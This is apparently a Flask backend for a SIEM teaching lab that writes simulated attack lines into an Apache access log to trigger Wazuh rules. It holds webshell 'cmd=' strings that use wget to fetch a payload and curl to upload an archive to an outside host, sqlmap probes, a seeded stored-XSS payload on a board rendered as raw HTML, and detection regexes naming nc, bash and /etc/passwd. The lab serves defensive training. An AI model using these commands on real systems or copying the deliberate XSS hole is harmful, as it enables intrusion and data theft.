#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================================
# SIEM Lab - live demo backend (Flask)
# Serves the intranet mockup and turns the console buttons into REAL access.log
# writes so the existing Wazuh rules fire live during a lecture.
# IMPORTANT: no endpoint EVER executes a system command. Each endpoint only
# formats Combined-format log line(s) (identical shape to the planted dataset)
# and appends them to access.log. Pure file I/O — completely inert.
# ============================================================================
import os, random
from datetime import datetime, timedelta, timezone
from flask import Flask, jsonify, request, send_from_directory

APP_DIR    = os.path.dirname(os.path.abspath(__file__))
ACCESS_LOG = os.environ.get("DEMO_ACCESS_LOG", "/var/log/apache2/access.log")
KST = timezone(timedelta(hours=9))

# One external attacker address drives the whole live kill-chain, so the
# instructor can filter Wazuh by a single IP and watch the story unfold.
ATTACKER   = "203.0.113.66"           # RFC 5737 doc range (matches dataset)
PAYLOAD_SRV = "198.51.100.47"
UA_ATTACK  = "Mozilla/5.0 (X11; Linux x86_64) curl/7.81.0"
UA_SQLMAP  = "sqlmap/1.7.2#stable (https://sqlmap.org)"
UA_NORMAL  = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
             "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")
NORMAL_PATHS = ["/portal/dashboard", "/portal/notices", "/index.html",
                "/api/status", "/docs/guide.html", "/portal/calendar",
                "/portal/board/free", "/api/v1/notices"]

app = Flask(__name__, static_folder=None)

def now_apache():
    return datetime.now(tz=KST).strftime("%d/%b/%Y:%H:%M:%S %z")

def combined(ip, method, path, status, size, ua, referer="-"):
    return (f'{ip} - - [{now_apache()}] "{method} {path} HTTP/1.1" '
            f'{status} {size} "{referer}" "{ua}"')

def append_lines(lines):
    """Append pre-formatted log lines. No shell, no exec — just file I/O."""
    with open(ACCESS_LOG, "a", encoding="utf-8") as f:
        for l in lines:
            f.write(l + "\n")

def anat_of(method, path, ip):
    """Break an HTTP request into 'where/how' parts so learners SEE the attack:
    대상 페이지 · 메서드 · 주입 위치 · 페이로드 · 출발지."""
    from urllib.parse import unquote_plus
    page = path.split("?", 1)[0]
    vector, payload = "-", "-"
    if "?" in path:
        qs = path.split("?", 1)[1]
        if "=" in qs:
            k, v = qs.split("=", 1)
            vector = f"{k}= 파라미터"
            payload = unquote_plus(v)
        else:
            vector, payload = "쿼리스트링", qs
    return dict(page=page, method=method, vector=vector, payload=payload, src=ip)

# --- attack scenarios: each writes access.log line(s) that fire a Wazuh rule --- #
# req items: (method, path, status, size)
SCENARIOS = {
 "webshell": dict(
    label="① 웹셸 명령 실행", stage="실행",
    ip=ATTACKER, ua=UA_ATTACK, rule="100101", color="suspect",
    req=[("GET", "/search.php?cmd=id", 200, 120)],
    detail="웹셸을 통한 원격 명령 실행(cmd=id)",
    expect="rule.id 100101 · 웹셸 명령 실행 시도"),
 "download": dict(
    label="② 페이로드 다운로드", stage="다운로드",
    ip=ATTACKER, ua=UA_ATTACK, rule="100101", color="suspect",
    req=[("GET", f"/search.php?cmd=wget+http://{PAYLOAD_SRV}/kworker+-O+/tmp/.cache/kworker", 200, 90)],
    detail="웹셸로 악성 파일 다운로드(cmd=wget)",
    expect="rule.id 100101 · 악성 페이로드 다운로드"),
 "exfil": dict(
    label="③ 정보 유출", stage="유출",
    ip=ATTACKER, ua=UA_ATTACK, rule="100101", color="suspect",
    req=[("GET", f"/search.php?cmd=curl+-T+/tmp/loot.tgz+http://{PAYLOAD_SRV}/up", 200, 80)],
    detail="압축 파일 외부 업로드(cmd=curl -T)",
    expect="rule.id 100101 · 외부로 데이터 유출"),
 "scanner": dict(
    label="웹 취약점 스캐너", stage="정찰",
    ip=ATTACKER, ua=UA_SQLMAP, rule="100102", color="warn",
    req=[("GET", "/index.php?id=1+AND+1=1", 404, 330), ("GET", "/admin.php", 404, 300),
         ("GET", "/.env", 404, 280), ("GET", "/phpmyadmin/", 404, 300),
         ("GET", "/wp-login.php", 404, 290)],
    detail="sqlmap 스캐너 정찰(다수 404)",
    expect="rule.id 100102 · 웹 스캐너 탐지"),
 "flood": dict(
    label="로그인 반복 시도", stage="무차별",
    ip=ATTACKER, ua=UA_ATTACK, rule="5710 계열", color="warn",
    req=[("GET", f"/portal/login?try={i}", 401, 210) for i in range(15)],
    detail="짧은 간격 로그인 반복(15건)",
    expect="반복 인증 실패 패턴"),
}

# ---- static ---------------------------------------------------------------- #
@app.route("/")
def index():
    return send_from_directory(APP_DIR, "live_demo_target_site.html")

@app.route("/demo/config")
def demo_config():
    return jsonify(attacker=ATTACKER, access_log=ACCESS_LOG,
                   scenarios={k: {"label": v["label"], "stage": v["stage"],
                                  "rule": v["rule"], "color": v["color"],
                                  "expect": v["expect"]} for k, v in SCENARIOS.items()})

# ---- demo endpoints (log-only, no command execution) ----------------------- #
@app.route("/demo/normal", methods=["POST"])
def demo_normal():
    ip = f"192.168.208.{random.randint(100,240)}"
    path = random.choice(NORMAL_PATHS)
    line = combined(ip, "GET", path, 200, random.randint(400, 6000), UA_NORMAL)
    append_lines([line])
    return jsonify(detail="정상 직원 트래픽 1건", added=1, lines=[line],
                   rule="탐지 없음(정상)", ip=ip, expect="정상 트래픽 — 알림 없음",
                   anat=anat_of("GET", path, ip))

@app.route("/demo/act/<name>", methods=["POST"])
def demo_act(name):
    sc = SCENARIOS.get(name)
    if not sc:
        return jsonify(error="unknown scenario"), 404
    lines = [combined(sc["ip"], m, p, s, sz, sc["ua"]) for (m, p, s, sz) in sc["req"]]
    append_lines(lines)
    m0, p0 = sc["req"][0][0], sc["req"][0][1]
    return jsonify(detail=sc["detail"], added=len(lines), lines=lines,
                   rule=sc["rule"], ip=sc["ip"], expect=sc["expect"],
                   ua=sc["ua"], anat=anat_of(m0, p0, sc["ip"]))

# --- interactive attack surfaces: search box (RCE-ish) + board (stored XSS) --- #
import re, html
CMD_PAT = re.compile(r"(;|\||&&|`|\$\(|\bid\b|\bwhoami\b|\buname\b|\bcat\b|\bwget\b|"
                     r"\bcurl\b|\bnc\b|\bbash\b|/etc/passwd|cmd=)", re.I)
XSS_PAT = re.compile(r"(<script|onerror\s*=|onload\s*=|javascript:|<img|<svg|<iframe|"
                     r"document\.cookie|alert\s*\()", re.I)

def _ts():
    return datetime.now(tz=KST).strftime("%m-%d %H:%M")

# in-memory board; seeded with normal posts + ONE hidden stored-XSS payload so
# students can hunt the planted vulnerability. Bodies are rendered as raw HTML
# on the (intentionally vulnerable) target page — that IS the stored-XSS lesson.
BOARD = [
 dict(id=1, author="이수민 사원", body="워크숍 자료 공유 감사합니다. 잘 봤어요!", ts=_ts(), xss=False),
 dict(id=2, author="박준영 대리", body="3분기 회의실 예약은 어디서 하나요?", ts=_ts(), xss=False),
 dict(id=3, author="guest_7f2c",
      body='좋은 정보네요 <img src=x onerror="document.getElementById(\'xss-flag\')&&(document.getElementById(\'xss-flag\').textContent=\'⚠ 저장형 XSS 실행됨 (guest_7f2c)\')">',
      ts=_ts(), xss=True),   # <-- 숨겨진 저장형 XSS
 dict(id=4, author="정민지 과장", body="다음 배포 일정도 공지 부탁드립니다.", ts=_ts(), xss=False),
]

@app.route("/demo/search", methods=["POST"])
def demo_search():
    q = (request.json or {}).get("q", "").strip()[:200]
    if not q:
        return jsonify(error="검색어를 입력하세요"), 400
    attack = bool(CMD_PAT.search(q))
    if attack:   # search box is the webshell entry point -> log as cmd= (rule 100101)
        from urllib.parse import quote
        line = combined(ATTACKER, "GET", f"/search.php?cmd={quote(q, safe='')}", 200, 120, UA_ATTACK)
        append_lines([line])
        return jsonify(flagged=True, rule="100101", ip=ATTACKER, echo=q,
                       detail="검색창에 시스템 명령이 주입되었습니다(웹셸 패턴).",
                       expect="rule.id 100101 · 웹셸 명령 실행 시도", lines=[line],
                       anat=dict(page="/search.php", method="GET", vector="cmd= 파라미터(검색 입력)",
                                 payload=q, src=ATTACKER))
    ip = f"192.168.208.{random.randint(100,240)}"
    line = combined(ip, "GET", f"/search.php?q={q}", 200, random.randint(300,1500), UA_NORMAL)
    append_lines([line])
    return jsonify(flagged=False, rule="탐지 없음", ip=ip, echo=q,
                   detail="정상 검색 요청으로 처리되었습니다.", expect="정상 트래픽", lines=[line],
                   anat=dict(page="/search.php", method="GET", vector="q= 파라미터", payload=q, src=ip))

@app.route("/demo/board", methods=["GET", "POST"])
def demo_board():
    if request.method == "POST":
        d = request.json or {}
        author = html.escape((d.get("author", "") or "익명").strip()[:40]) or "익명"
        body   = (d.get("body", "") or "").strip()[:500]
        if not body:
            return jsonify(error="내용을 입력하세요"), 400
        xss = bool(XSS_PAT.search(body))
        BOARD.append(dict(id=(BOARD[-1]["id"]+1 if BOARD else 1),
                          author=author, body=body, ts=_ts(), xss=xss))
        # log the write attempt (note: POST bodies are NOT in access.log by default —
        # a teaching point that not every attack is visible in the web access log)
        line = combined(ATTACKER if xss else f"192.168.208.{random.randint(100,240)}",
                        "POST", "/board/write", 200, 90, UA_ATTACK if xss else UA_NORMAL)
        append_lines([line])
        return jsonify(ok=True, xss=xss,
                       rule=("저장형 XSS(웹 로그 미탐)" if xss else "탐지 없음"),
                       expect=("브라우저에서 스크립트 실행 — 접근 로그로는 탐지 어려움" if xss else "정상"),
                       detail=("저장형 XSS 페이로드가 게시글로 저장되었습니다." if xss
                               else "정상 게시글이 등록되었습니다."),
                       anat=dict(page="/board/write", method="POST",
                                 vector="게시글 본문(저장형 stored)", payload=body[:120],
                                 src=(ATTACKER if xss else "내부 사용자")),
                       note=("POST 본문은 access.log의 URL에 남지 않습니다 — "
                             "웹 접근 로그만으론 XSS 본문을 못 볼 수 있습니다(앱/WAF 로그 필요)."))
    return jsonify(posts=BOARD)

@app.route("/demo/visit", methods=["POST"])
def demo_visit():
    """A student clicking around the mockup generates realistic normal traffic."""
    path = ((request.json or {}).get("path", "/") or "/")[:120]
    ip = f"192.168.208.{random.randint(100,240)}"
    line = combined(ip, "GET", path, 200, random.randint(400, 6000), UA_NORMAL)
    append_lines([line])
    return jsonify(ok=True, line=line)

@app.route("/demo/ticket", methods=["POST"])
def demo_ticket():
    """Helpdesk 1:1 문의 — another user input surface. Command-injection in the
    ticket body is logged as a webshell-style request (rule 100101)."""
    d = request.json or {}
    body = (d.get("body", "") or "").strip()[:200]
    if not body:
        return jsonify(error="문의 내용을 입력하세요"), 400
    attack = bool(CMD_PAT.search(body))
    if attack:
        from urllib.parse import quote
        line = combined(ATTACKER, "GET", f"/helpdesk/run?cmd={quote(body, safe='')}", 200, 120, UA_ATTACK)
        append_lines([line])
        return jsonify(flagged=True, rule="100101", detail="헬프데스크 문의에 명령이 주입되었습니다.",
                       expect="rule.id 100101 · 웹셸 명령 실행 시도",
                       anat=dict(page="/helpdesk/run", method="GET", vector="cmd= 파라미터(문의 입력)",
                                 payload=body, src=ATTACKER))
    ip = f"192.168.208.{random.randint(100,240)}"
    line = combined(ip, "POST", "/helpdesk/ticket", 200, 90, UA_NORMAL)
    append_lines([line])
    return jsonify(flagged=False, rule="탐지 없음", detail="문의가 정상 접수되었습니다.",
                   anat=dict(page="/helpdesk/ticket", method="POST", vector="문의 본문", payload=body, src=ip))

@app.route("/demo/log")
def demo_log():
    n = min(int(request.args.get("n", 16)), 60)
    try:
        with open(ACCESS_LOG, "r", encoding="utf-8", errors="replace") as f:
            tail = f.read().splitlines()[-n:]
    except FileNotFoundError:
        tail = []
    return jsonify(lines=tail)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("DEMO_PORT", "8080")))
